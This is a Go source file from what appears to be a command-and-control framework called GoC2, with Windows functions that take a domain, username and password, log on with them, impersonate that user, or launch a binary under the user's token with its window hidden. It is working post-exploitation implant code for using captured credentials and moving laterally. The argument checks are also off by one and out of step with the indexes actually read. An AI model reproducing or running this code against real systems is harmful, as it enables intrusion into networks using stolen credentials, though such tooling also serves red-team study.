//go:build windows
// +build windows

package runbinary

import (
	"errors"
	"fmt"
	"syscall"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func RunAsNetOnly(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args.")
	}
	domainW := args[0]
	userW := args[1]
	passW := args[2]
	var hToken syscall.Handle
	var bufferSz uint32 = 255
	buffer := make([]uint16, bufferSz)
	err := windows.GetUserNameEx(2, &buffer[0], &bufferSz)
	if err != nil {
		return "", err
	}
	ok, err := winapi.LogonUser(userW, domainW, passW, 9, 3, &hToken)
	if !ok {
		return "", err
	}
	worked, err := winapi.ImpersonateLoggedOnUser(windows.Token(hToken))
	if !worked {
		return "", err
	}
	windows.CloseHandle(windows.Handle(hToken))
	return fmt.Sprintf("NETONLY Impersonating %s\\%s", domainW, userW), nil
}

func RunAs(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args.")
	}
	domainW := args[0]
	userW := args[1]
	passW := args[2]
	binaryPath := args[3]
	var hToken syscall.Handle
	var bufferSz uint32 = 255
	buffer := make([]uint16, bufferSz)
	err := windows.GetUserNameEx(2, &buffer[0], &bufferSz)
	if err != nil {
		return "", err
	}
	path := syscall.StringToUTF16Ptr(binaryPath)
	ok, err := winapi.LogonUser(userW, domainW, passW, 8, 3, &hToken)
	if !ok {
		return "", err
	}
	/*
		worked, err := winapi.ImpersonateLoggedOnUser(windows.Token(hToken))
		if !worked {
			return "", err
		}

		var bufferSz2 uint32 = 255
		buffer2 := make([]uint16, bufferSz)
		err = windows.GetUserNameEx(2, &buffer2[0], &bufferSz2)
		if err != nil {
			return "", err
		}
		newUser := windows.UTF16ToString(buffer2)
		if originalUser == newUser {
			return "", errors.New("Failed to impersonate user.")
		}
	*/
	/*
		ok, err = winapi.CreateProcessWithTokenW(hToken, 2, path, windows.CREATE_NO_WINDOW, 0, si, pi)
		if !ok {
			windows.CloseHandle(windows.Handle(hToken))
			return "", err
		}*/
	si := &windows.StartupInfo{}
	si.ShowWindow = winapi.ShowWindow
	si.Flags = si.Flags | winapi.STARTF_USESHOWWINDOW
	pi := &windows.ProcessInformation{}
	ok, err = winapi.CreateProcessWithTokenW(hToken, 2, path, windows.CREATE_NO_WINDOW, 0, si, pi)
	if !ok {
		return "", err
	}
	windows.CloseHandle(windows.Handle(hToken))
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	return fmt.Sprintf("[+] Created Process As User %s %d", userW, pi.ProcessId), err

}
